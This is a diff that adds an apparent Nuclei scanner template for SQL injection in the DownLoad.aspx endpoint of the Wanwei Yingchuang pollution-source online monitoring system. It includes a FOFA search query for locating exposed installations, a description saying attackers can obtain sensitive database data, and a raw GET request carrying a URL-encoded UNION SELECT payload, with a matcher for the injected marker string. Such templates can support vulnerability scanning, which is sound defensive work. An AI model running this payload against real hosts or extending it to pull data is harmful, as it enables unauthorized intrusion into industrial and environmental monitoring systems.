@@ -1,0 +1,22 @@
+id: wanwei-yingchuang-pollution-monitor-download-sqli
+
+info:
+  name: "万维盈创污染源在线监控系统DownLoad.aspx接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="ImgGwry/download.png" || (body="images/errorpage.gif" && body="错误页面")
+      该系统DownLoad.aspx接口存在SQL注入安全缺陷，攻击者可通过构造恶意请求参数获取数据库敏感信息。漏洞影响范围包含部署目标组件的服务器，需通过特定注入点触发数据库查询逻辑异常。
+  tags: 万维盈创污染源在线监控系统
+
+http:
+- raw:
+  - |
+    GET /MainSystem/OperationManage/DownLoad.aspx?action=GetFile&FileID=%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2CNULL--%20seHw HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qzqjq'
